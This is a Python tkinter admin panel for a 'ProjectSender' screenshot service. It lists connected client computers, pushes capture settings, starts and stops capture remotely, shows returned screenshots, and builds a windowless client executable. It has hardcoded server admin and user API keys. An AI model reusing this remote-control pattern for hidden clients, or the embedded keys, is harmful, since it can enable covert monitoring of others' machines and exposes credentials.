import os, json, time, threading, subprocess, sys, base64
from io import BytesIO
import tkinter as tk
from tkinter import messagebox
from tkinter.scrolledtext import ScrolledText
from PIL import Image, ImageTk
import requests

CONFIG_FILE = "panel_config.json"
DEFAULT_SERVER = "https://sender-production-32bc.up.railway.app"
DEFAULT_ADMIN_KEY = "skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR"
DEFAULT_USER_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"

def load_cfg():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    cfg = {"server_url": DEFAULT_SERVER, "admin_api_key": DEFAULT_ADMIN_KEY, "user_api_key": DEFAULT_USER_KEY}
    save_cfg(cfg)
    return cfg

def save_cfg(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

class Panel:
    def __init__(self, root):
        self.root = root
        self.root.title("ProjectSender Screenshot Admin PRO")
        self.root.geometry("1600x900")
        self.cfg = load_cfg()
        self.clients = []
        self.selected = None
        self.img_refs = []
        self.build_ui()
        self.refresh_clients()
        self.auto_refresh()

    def build_ui(self):
        bg = "#0e1328"; card = "#202a49"; fg = "white"; cyan = "#00e5ff"
        self.root.configure(bg=bg)
        tk.Label(self.root, text="📸 ProjectSender Screenshot Admin PRO", bg=bg, fg=cyan, font=("Arial", 16, "bold")).pack(anchor="w", padx=16, pady=10)

        api = tk.LabelFrame(self.root, text="API Settings - Test + Save", bg=bg, fg=fg)
        api.pack(fill="x", padx=10, pady=4)
        tk.Label(api, text="Server URL:", bg=bg, fg=fg).grid(row=0, column=0, sticky="w", padx=8, pady=3)
        self.server_var = tk.StringVar(value=self.cfg.get("server_url", DEFAULT_SERVER))
        tk.Entry(api, textvariable=self.server_var, bg=card, fg=fg, insertbackground=fg, width=80).grid(row=0, column=1, sticky="ew", pady=3)
        tk.Label(api, text="Admin API Key:", bg=bg, fg=fg).grid(row=1, column=0, sticky="w", padx=8, pady=3)
        self.admin_key_var = tk.StringVar(value=self.cfg.get("admin_api_key", DEFAULT_ADMIN_KEY))
        tk.Entry(api, textvariable=self.admin_key_var, bg=card, fg=fg, insertbackground=fg, width=80, show="*").grid(row=1, column=1, sticky="ew", pady=3)
        tk.Label(api, text="User API Key:", bg=bg, fg=fg).grid(row=2, column=0, sticky="w", padx=8, pady=3)
        self.user_key_var = tk.StringVar(value=self.cfg.get("user_api_key", DEFAULT_USER_KEY))
        tk.Entry(api, textvariable=self.user_key_var, bg=card, fg=fg, insertbackground=fg, width=80, show="*").grid(row=2, column=1, sticky="ew", pady=3)
        tk.Button(api, text="✅ Test + Save API", bg="#00e676", command=self.test_save).grid(row=0, column=2, rowspan=3, padx=12, ipadx=18, ipady=12)
        self.api_status = tk.Label(api, text="API READY", bg=bg, fg="#00ff88", font=("Arial", 10, "bold"))
        self.api_status.grid(row=0, column=3, rowspan=3, padx=15)
        api.columnconfigure(1, weight=1)

        body = tk.Frame(self.root, bg=bg)
        body.pack(fill="both", expand=True, padx=10, pady=5)

        left = tk.LabelFrame(body, text="Connected Clients", bg=bg, fg=fg)
        left.pack(side="left", fill="y", padx=(0,8))
        self.listbox = tk.Listbox(left, bg=card, fg=fg, width=34, height=28)
        self.listbox.pack(fill="both", expand=True, padx=8, pady=8)
        self.listbox.bind("<<ListboxSelect>>", self.on_select)
        tk.Button(left, text="↻ Refresh Now", bg="#0588de", fg="white", command=self.refresh_clients).pack(fill="x", padx=8, pady=4)
        tk.Button(left, text="🔨 Build screenshot.exe", bg="#a923b9", fg="white", command=self.build_exe).pack(fill="x", padx=8, pady=4)
        tk.Button(left, text="▶ Run local client.py", bg="#00b85c", fg="white", command=self.run_client).pack(fill="x", padx=8, pady=4)

        right = tk.Frame(body, bg=bg)
        right.pack(side="left", fill="both", expand=True)

        info = tk.LabelFrame(right, text="Client Information", bg=bg, fg=fg)
        info.pack(fill="x", pady=3)
        self.info_box = ScrolledText(info, bg=card, fg=fg, height=5)
        self.info_box.pack(fill="x", padx=8, pady=8)

        conf = tk.LabelFrame(right, text="Capture Configuration", bg=bg, fg=fg)
        conf.pack(fill="x", pady=3)
        self.url_var = tk.StringVar(value="https://example.com")
        self.count_var = tk.IntVar(value=10)
        self.delay_var = tk.DoubleVar(value=2.0)
        tk.Label(conf, text="Target URL:", bg=bg, fg=fg).grid(row=0, column=0, sticky="w", padx=8, pady=5)
        tk.Entry(conf, textvariable=self.url_var, bg=card, fg=fg, insertbackground=fg).grid(row=0, column=1, sticky="ew", padx=8, pady=5)
        tk.Label(conf, text="Photo Count:", bg=bg, fg=fg).grid(row=1, column=0, sticky="w", padx=8, pady=5)
        tk.Spinbox(conf, from_=1, to=500, textvariable=self.count_var, width=10).grid(row=1, column=1, sticky="w", padx=8, pady=5)
        tk.Label(conf, text="Delay (sec):", bg=bg, fg=fg).grid(row=2, column=0, sticky="w", padx=8, pady=5)
        tk.Spinbox(conf, from_=0.5, to=60, increment=0.5, textvariable=self.delay_var, width=10).grid(row=2, column=1, sticky="w", padx=8, pady=5)
        conf.columnconfigure(1, weight=1)

        controls = tk.Frame(right, bg="#1b2442")
        controls.pack(fill="x", pady=5)
        tk.Button(controls, text="💾 Save Config", bg="#0588de", fg="white", command=self.save_config).pack(side="left", padx=8, pady=10, ipadx=15, ipady=6)
        tk.Button(controls, text="✅ Start Capture", bg="#00e676", command=self.start_capture).pack(side="left", padx=8, pady=10, ipadx=15, ipady=6)
        tk.Button(controls, text="⏹ Stop Capture", bg="#ff4444", fg="white", command=self.stop_capture).pack(side="left", padx=8, pady=10, ipadx=15, ipady=6)

        lower = tk.Frame(right, bg=bg)
        lower.pack(fill="both", expand=True)

        logs = tk.LabelFrame(lower, text="Live Client Logs", bg=bg, fg=fg)
        logs.pack(side="left", fill="both", expand=True, padx=(0,5))
        self.log_box = ScrolledText(logs, bg=card, fg=fg)
        self.log_box.pack(fill="both", expand=True, padx=8, pady=8)

        shots = tk.LabelFrame(lower, text="Client Screenshots Gallery", bg=bg, fg=fg)
        shots.pack(side="left", fill="both", expand=True, padx=(5,0))
        self.gallery_canvas = tk.Canvas(shots, bg=card, highlightthickness=0)
        self.gallery_frame = tk.Frame(self.gallery_canvas, bg=card)
        self.gallery_canvas.create_window((0,0), window=self.gallery_frame, anchor="nw")
        self.gallery_canvas.pack(fill="both", expand=True, padx=8, pady=8)
        self.gallery_frame.bind("<Configure>", lambda e: self.gallery_canvas.configure(scrollregion=self.gallery_canvas.bbox("all")))

    def base(self): return self.server_var.get().rstrip("/")
    def headers(self): return {"X-API-Key": self.admin_key_var.get().strip()}

    def api(self, method, path, data=None):
        r = requests.request(method, self.base()+path, headers=self.headers(), json=data, timeout=10)
        r.raise_for_status()
        return r.json()

    def test_save(self):
        try:
            r = self.api("GET", "/health")
            self.cfg = {"server_url": self.server_var.get().strip(), "admin_api_key": self.admin_key_var.get().strip(), "user_api_key": self.user_key_var.get().strip()}
            save_cfg(self.cfg)
            self.api_status.config(text="API OK", fg="#00ff88")
            messagebox.showinfo("OK", "API saved and health OK")
        except Exception as e:
            self.api_status.config(text="API FAILED", fg="#ff4444")
            messagebox.showerror("API Failed", str(e))

    def refresh_clients(self):
        try:
            data = self.api("GET", "/api/clients")
            self.clients = data.get("clients", [])
            self.listbox.delete(0, "end")
            for c in self.clients:
                name = f"{c.get('computer','PC')} | {c.get('status','?')} | shots:{c.get('screenshots_count',0)}"
                self.listbox.insert("end", name)
            self.api_status.config(text="API OK", fg="#00ff88")
        except Exception as e:
            self.api_status.config(text="API FAILED", fg="#ff4444")
            self.log(f"API error: {e}")

    def on_select(self, event=None):
        sel = self.listbox.curselection()
        if not sel:
            return
        self.selected = self.clients[sel[0]].get("client_id")
        self.load_client()

    def load_client(self):
        if not self.selected:
            return
        try:
            data = self.api("GET", f"/api/client/{self.selected}")
            c = data.get("client") or {}
            self.info_box.delete("1.0", "end")
            self.info_box.insert("end", json.dumps(c, indent=2))
            cfg = c.get("config") or {}
            if cfg:
                self.url_var.set(cfg.get("target_url", self.url_var.get()))
                self.count_var.set(int(cfg.get("photo_count", self.count_var.get())))
                self.delay_var.set(float(cfg.get("delay", self.delay_var.get())))
            self.log_box.delete("1.0", "end")
            for l in data.get("logs", []):
                self.log_box.insert("end", f"[{time.strftime('%H:%M:%S', time.localtime(l.get('ts',0)))}] {l.get('level','info')}: {l.get('message','')}\n")
            self.render_gallery(data.get("screenshots", []))
        except Exception as e:
            self.log(f"load client error: {e}")

    def render_gallery(self, shots):
        for w in self.gallery_frame.winfo_children():
            w.destroy()
        self.img_refs.clear()
        row = col = 0
        for s in reversed(shots[-20:]):
            try:
                raw = base64.b64decode(s["image_base64"])
                img = Image.open(BytesIO(raw))
                img.thumbnail((220, 140))
                tkimg = ImageTk.PhotoImage(img)
                self.img_refs.append(tkimg)
                box = tk.Frame(self.gallery_frame, bg="#10172f", bd=1, relief="solid")
                tk.Label(box, image=tkimg, bg="#10172f").pack()
                tk.Label(box, text=s.get("filename","photo.png"), bg="#10172f", fg="white").pack(fill="x")
                box.grid(row=row, column=col, padx=6, pady=6)
                col += 1
                if col >= 3:
                    col = 0; row += 1
            except Exception:
                pass

    def selected_required(self):
        if not self.selected:
            messagebox.showwarning("No client", "Select a client first")
            return False
        return True

    def save_config(self):
        if not self.selected_required(): return
        self.api("POST", "/api/set_config", {"client_id": self.selected, "target_url": self.url_var.get(), "photo_count": int(self.count_var.get()), "delay": float(self.delay_var.get())})
        self.load_client()

    def start_capture(self):
        if not self.selected_required(): return
        self.save_config()
        self.api("POST", "/api/start", {"client_id": self.selected})
        self.load_client()

    def stop_capture(self):
        if not self.selected_required(): return
        self.api("POST", "/api/stop", {"client_id": self.selected})
        self.load_client()

    def build_exe(self):
        try:
            subprocess.Popen([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "screenshot_client", "screenshot_client.py"])
            messagebox.showinfo("Build", "Build started. Check dist/screenshot_client.exe")
        except Exception as e:
            messagebox.showerror("Build error", str(e))

    def run_client(self):
        subprocess.Popen([sys.executable, "screenshot_client.py"])

    def log(self, msg):
        self.log_box.insert("end", f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_box.see("end")

    def auto_refresh(self):
        self.refresh_clients()
        if self.selected:
            self.load_client()
        self.root.after(5000, self.auto_refresh)

if __name__ == "__main__":
    root = tk.Tk()
    Panel(root)
    root.mainloop()
